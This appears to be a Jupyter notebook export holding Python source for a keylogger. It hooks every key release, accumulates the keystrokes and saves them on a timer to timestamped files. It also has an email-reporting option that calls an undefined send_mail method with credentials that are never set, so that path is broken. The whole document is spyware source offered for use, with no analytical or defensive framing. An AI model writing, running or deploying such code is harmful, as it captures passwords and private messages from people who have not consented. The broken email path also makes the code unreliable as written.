#!/usr/bin/env python
# coding: utf-8

# In[1]:


pip install keyboard


# In[ ]:


import keyboard
import smtplib, ssl
from threading import Timer
from datetime import datetime


TIME = 120 # in seconds

context = ssl.create_default_context()


class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.time_start = datetime.now()
        self.time_end = datetime.now()

    def content(self, event):
        name = event.name
        if len(name) > 1:
            name = f"[{name.upper()}]"
        self.log += name

    def set_filename(self):
        file_start = str(self.time_start)[:-7].replace(" ", "-").replace(":", "")
        file_end = str(self.time_end)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{file_start}_{file_end}"

    def write_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"Saved {self.filename}.txt")

    def report(self):
        if self.log:
            self.time_end = datetime.now()
            self.set_filename()
            if self.report_method == "email":
                self.send_mail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.write_file()

            self.time_start = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.content)
        self.report()
        keyboard.wait()


if __name__ == "__main__":
    print(keyboard.all_modifiers)
    keylogger = Keylogger(interval=TIME, report_method="file")
    keylogger.start()


# In[ ]:




